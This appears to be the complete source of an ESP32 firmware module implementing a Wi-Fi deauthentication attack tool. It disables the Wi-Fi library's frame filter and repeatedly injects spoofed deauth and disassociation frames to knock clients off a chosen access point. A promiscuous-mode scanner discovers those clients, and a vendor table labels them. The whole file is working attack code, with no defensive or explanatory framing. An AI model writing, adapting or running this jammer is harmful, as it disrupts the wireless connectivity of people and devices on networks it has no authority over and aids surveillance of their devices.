// deauther.cpp -- active 802.11 deauth/disassoc transmitter + client discovery
// (see deauther.h).
#include "deauther.h"
#include <string.h>
#include <stdio.h>
#include "freertos/FreeRTOS.h"
#include "esp_wifi.h"
#include "esp_timer.h"
#include "esp_log.h"

static const char* TAG = "deauth";

#define BURST_MS    50       // transmit interval (ms)
#define REASON      0x01     // 802.11 reason code 1 = unspecified
#define MAX_TGT     32       // selectable stations per burst
#define STA_MAX     32       // stations tracked by the scanner

// IDF filters deauth/disassoc frames out of esp_wifi_80211_tx() through this
// internal sanity check (a symbol in the WiFi library). Defining it here
// (always-pass) lets our raw management frames go out. The CMakeLists uses
// -Wl,--allow-multiple-definition so our definition wins. Standard ESP32
// deauther technique; affects raw injection only.
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  (void)arg; (void)arg2; (void)arg3;
  return 0;
}

// ======================= Transmitter =======================
static uint8_t            g_bssid[6];
static uint8_t            g_targets[MAX_TGT][6];
static int                g_ntgt       = 0;    // 0 = broadcast
static uint8_t            g_chan       = 1;
static bool               g_running    = false;
static volatile uint32_t  g_sent       = 0;
static esp_timer_handle_t g_tmr        = 0;

// 26-byte deauth/disassoc frame template. addr1=dest addr2=src addr3=bssid.
static uint8_t g_frame[26] = {
  0xC0, 0x00,                          // frame control (subtype set per send)
  0x00, 0x00,                          // duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // addr1 (destination)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // addr2 (source)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // addr3 (BSSID)
  0x00, 0x00,                          // sequence (filled by driver)
  REASON, 0x00                         // reason code
};

// subtype: 0xC0 = deauth, 0xA0 = disassoc.
static void send_one(uint8_t subtype, const uint8_t* a1, const uint8_t* a2) {
  g_frame[0] = subtype;
  memcpy(g_frame + 4,  a1, 6);
  memcpy(g_frame + 10, a2, 6);
  memcpy(g_frame + 16, g_bssid, 6);
  if (esp_wifi_80211_tx(WIFI_IF_STA, g_frame, sizeof(g_frame), true) == ESP_OK)
    g_sent = g_sent + 1;
}

static void burst_cb(void* arg) {
  (void)arg;
  static const uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  if (g_ntgt == 0) {
    for (int i = 0; i < 3; i++) {
      send_one(0xC0, bcast, g_bssid);          // deauth   AP -> all
      send_one(0xA0, bcast, g_bssid);          // disassoc AP -> all
    }
    return;
  }
  for (int t = 0; t < g_ntgt; t++) {
    const uint8_t* c = g_targets[t];
    for (int i = 0; i < 2; i++) {
      send_one(0xC0, c, g_bssid);              // deauth   AP -> client
      send_one(0xA0, c, g_bssid);              // disassoc AP -> client
      send_one(0xC0, g_bssid, c);              // deauth   client -> AP
      send_one(0xA0, g_bssid, c);              // disassoc client -> AP
    }
  }
}

bool deauther_start_targets(const uint8_t bssid[6], uint8_t channel,
                            const uint8_t (*targets)[6], int count) {
  if (g_running) deauther_stop();
  memcpy(g_bssid, bssid, 6);
  if (!targets || count <= 0) {
    g_ntgt = 0;
  } else {
    g_ntgt = count > MAX_TGT ? MAX_TGT : count;
    for (int i = 0; i < g_ntgt; i++) memcpy(g_targets[i], targets[i], 6);
  }
  g_chan = (channel >= 1 && channel <= 14) ? channel : 1;
  g_sent = 0;

  if (esp_wifi_set_mode(WIFI_MODE_STA) != ESP_OK) return false;
  if (esp_wifi_start() != ESP_OK) return false;
  // Promiscuous parks the radio on one channel (no association, no scan hop).
  esp_wifi_set_promiscuous(true);
  if (esp_wifi_set_channel(g_chan, WIFI_SECOND_CHAN_NONE) != ESP_OK) {
    esp_wifi_set_promiscuous(false);
    return false;
  }

  esp_timer_create_args_t ta = {};
  ta.callback = burst_cb;
  ta.name     = "deauth";
  if (esp_timer_create(&ta, &g_tmr) != ESP_OK) {
    esp_wifi_set_promiscuous(false);
    return false;
  }
  esp_timer_start_periodic(g_tmr, (uint64_t)BURST_MS * 1000);
  g_running = true;
  ESP_LOGI(TAG, "start ch=%u targets=%d", g_chan, g_ntgt);
  return true;
}

bool deauther_start(const uint8_t bssid[6], uint8_t channel, const uint8_t* target) {
  if (target) {
    uint8_t one[1][6];
    memcpy(one[0], target, 6);
    return deauther_start_targets(bssid, channel, one, 1);
  }
  return deauther_start_targets(bssid, channel, NULL, 0);
}

void deauther_stop(void) {
  if (!g_running) return;
  if (g_tmr) { esp_timer_stop(g_tmr); esp_timer_delete(g_tmr); g_tmr = 0; }
  esp_wifi_set_promiscuous(false);
  g_running = false;
  ESP_LOGI(TAG, "stop (sent %u)", (unsigned)g_sent);
}

bool     deauther_running(void)      { return g_running; }
uint32_t deauther_sent(void)         { return g_sent; }
uint8_t  deauther_channel(void)      { return g_chan; }
const uint8_t* deauther_bssid(void)  { return g_bssid; }
int      deauther_target_count(void) { return g_ntgt; }

// ======================= Station scanner =======================
typedef struct {
  uint8_t  mac[6];
  int8_t   rssi;
  uint32_t packets;
  uint32_t last_ms;
} sta_t;

static sta_t             g_sta[STA_MAX];
static int               g_nsta       = 0;
static uint8_t           g_scan_bssid[6];
static bool              g_scanning   = false;
static volatile uint32_t g_scan_frames = 0;
static portMUX_TYPE      g_smux       = portMUX_INITIALIZER_UNLOCKED;

static uint32_t now_ms(void) { return (uint32_t)(esp_timer_get_time() / 1000); }

// Record a client MAC seen talking to the scanned AP. Skips multicast/broadcast
// and the AP's own address. Runs inside the promiscuous callback.
static void sta_touch(const uint8_t* mac, int8_t rssi) {
  if (mac[0] & 0x01) return;                       // multicast/broadcast bit
  if (!memcmp(mac, g_scan_bssid, 6)) return;       // the AP itself
  portENTER_CRITICAL(&g_smux);
  int found = -1, oldest = 0;
  for (int i = 0; i < g_nsta; i++) {
    if (!memcmp(g_sta[i].mac, mac, 6)) { found = i; break; }
    if (g_sta[i].last_ms < g_sta[oldest].last_ms) oldest = i;
  }
  int idx;
  if (found >= 0)              idx = found;
  else if (g_nsta < STA_MAX)   idx = g_nsta++;
  else                         idx = oldest;       // evict LRU
  sta_t* s = &g_sta[idx];
  if (found < 0) { memcpy(s->mac, mac, 6); s->packets = 0; }
  s->rssi    = rssi;
  s->packets = s->packets + 1;
  s->last_ms = now_ms();
  portEXIT_CRITICAL(&g_smux);
}

static void scan_cb(void* buf, wifi_promiscuous_pkt_type_t ptype) {
  (void)ptype;
  const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
  const uint8_t* p = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  if (len < 16) return;
  g_scan_frames++;

  uint8_t  fc0   = p[0];
  uint8_t  fc1   = p[1];
  uint8_t  ftype = (fc0 >> 2) & 0x3;
  bool     tods  = fc1 & 0x01;
  bool     fromds = (fc1 >> 1) & 0x01;
  const uint8_t* a1 = p + 4;
  const uint8_t* a2 = p + 10;
  const uint8_t* a3 = p + 16;
  int8_t rssi = pkt->rx_ctrl.rssi;

  if (ftype == 2) {                                // data: ToDS/FromDS reliable
    if (tods && !fromds) {                         // to AP: a1=bssid a2=station
      if (!memcmp(a1, g_scan_bssid, 6)) sta_touch(a2, rssi);
    } else if (!tods && fromds) {                  // from AP: a1=station a2=bssid
      if (!memcmp(a2, g_scan_bssid, 6)) sta_touch(a1, rssi);
    }
  } else if (ftype == 0 && len >= 22) {            // mgmt: a3=bssid, a2=transmitter
    if (!memcmp(a3, g_scan_bssid, 6) && memcmp(a2, g_scan_bssid, 6))
      sta_touch(a2, rssi);                         // a2 != bssid => station
  }
}

bool stationscan_start(const uint8_t bssid[6], uint8_t channel) {
  if (g_scanning) stationscan_stop();
  memcpy(g_scan_bssid, bssid, 6);
  portENTER_CRITICAL(&g_smux);
  g_nsta = 0;
  portEXIT_CRITICAL(&g_smux);
  g_scan_frames = 0;

  if (esp_wifi_set_mode(WIFI_MODE_STA) != ESP_OK) return false;
  if (esp_wifi_start() != ESP_OK) return false;

  wifi_promiscuous_filter_t filt = {};
  filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(scan_cb);
  if (esp_wifi_set_promiscuous(true) != ESP_OK) return false;
  uint8_t ch = (channel >= 1 && channel <= 14) ? channel : 1;
  if (esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE) != ESP_OK) {
    esp_wifi_set_promiscuous(false);
    return false;
  }
  g_scanning = true;
  ESP_LOGI(TAG, "stationscan ch=%u", ch);
  return true;
}

void stationscan_stop(void) {
  if (!g_scanning) return;
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  g_scanning = false;
}

bool     stationscan_running(void) { return g_scanning; }
uint32_t stationscan_frames(void)  { return g_scan_frames; }

int stationscan_count(void) {
  int n;
  portENTER_CRITICAL(&g_smux);
  n = g_nsta;
  portEXIT_CRITICAL(&g_smux);
  return n;
}

bool stationscan_get(int i, uint8_t mac[6], int8_t* rssi, uint32_t* packets) {
  bool ok = false;
  portENTER_CRITICAL(&g_smux);
  if (i >= 0 && i < g_nsta) {
    memcpy(mac, g_sta[i].mac, 6);
    if (rssi)    *rssi    = g_sta[i].rssi;
    if (packets) *packets = g_sta[i].packets;
    ok = true;
  }
  portEXIT_CRITICAL(&g_smux);
  return ok;
}

// ======================= Vendor (OUI) labels =======================
// Compact table of common consumer/device OUIs (first 3 MAC bytes). Phones
// usually randomize their MAC (handled separately), so this mostly names
// laptops, TVs, ESP boards and smart-home gadgets that use their real address.
typedef struct { uint8_t p[3]; const char* name; } oui_t;
static const oui_t OUI[] = {
  // Apple
  {{0x3C,0x07,0x54},"Apple"}, {{0xF0,0x18,0x98},"Apple"}, {{0xA4,0x5E,0x60},"Apple"},
  {{0xAC,0xBC,0x32},"Apple"}, {{0x88,0x66,0xA5},"Apple"}, {{0x70,0x56,0x81},"Apple"},
  {{0xD0,0x81,0x7A},"Apple"}, {{0x90,0xFD,0x61},"Apple"},
  // Samsung
  {{0x5C,0x0A,0x5B},"Samsung"}, {{0x8C,0x77,0x12},"Samsung"}, {{0xE8,0x50,0x8B},"Samsung"},
  {{0x34,0x23,0x87},"Samsung"}, {{0x50,0x85,0x69},"Samsung"},
  // Google / Nest
  {{0x3C,0x5A,0xB4},"Google"}, {{0x54,0x60,0x09},"Google"}, {{0xF4,0xF5,0xD8},"Google"},
  {{0xF8,0x8F,0xCA},"Google"},
  // Amazon (Echo/Fire)
  {{0x34,0xD2,0x70},"Amazon"}, {{0x40,0xB4,0xCD},"Amazon"}, {{0x74,0xC2,0x46},"Amazon"},
  {{0xFC,0x65,0xDE},"Amazon"}, {{0x68,0x54,0xFD},"Amazon"},
  // Espressif (ESP32/ESP8266)
  {{0x24,0x6F,0x28},"Espressif"}, {{0x30,0xAE,0xA4},"Espressif"}, {{0x7C,0x9E,0xBD},"Espressif"},
  {{0x84,0xF3,0xEB},"Espressif"}, {{0xA4,0x7B,0x9D},"Espressif"}, {{0xC4,0x4F,0x33},"Espressif"},
  {{0xDC,0x4F,0x22},"Espressif"}, {{0xEC,0xFA,0xBC},"Espressif"},
  // Raspberry Pi
  {{0xB8,0x27,0xEB},"RaspberryPi"}, {{0xDC,0xA6,0x32},"RaspberryPi"}, {{0xE4,0x5F,0x01},"RaspberryPi"},
  {{0x28,0xCD,0xC1},"RaspberryPi"},
  // Intel (laptops)
  {{0x3C,0xA9,0xF4},"Intel"}, {{0x7C,0x7A,0x91},"Intel"}, {{0x8C,0xA9,0x82},"Intel"},
  {{0xA0,0x88,0xB4},"Intel"},
  // Xiaomi / Huawei / TP-Link
  {{0x64,0x09,0x80},"Xiaomi"}, {{0xF8,0xA4,0x5F},"Xiaomi"},
  {{0x00,0xE0,0xFC},"Huawei"}, {{0x48,0x3C,0x0C},"Huawei"},
  {{0x50,0xC7,0xBF},"TP-Link"}, {{0xEC,0x08,0x6B},"TP-Link"}, {{0xA4,0x2B,0xB0},"TP-Link"},
};

void mac_label(const uint8_t mac[6], char* out, int len) {
  if (len <= 0) return;
  if (mac[0] & 0x02) { snprintf(out, len, "(random)"); return; }  // locally administered
  int n = (int)(sizeof(OUI) / sizeof(OUI[0]));
  for (int i = 0; i < n; i++) {
    if (OUI[i].p[0] == mac[0] && OUI[i].p[1] == mac[1] && OUI[i].p[2] == mac[2]) {
      snprintf(out, len, "%s", OUI[i].name);
      return;
    }
  }
  snprintf(out, len, "%02X:%02X:%02X", mac[0], mac[1], mac[2]);
}
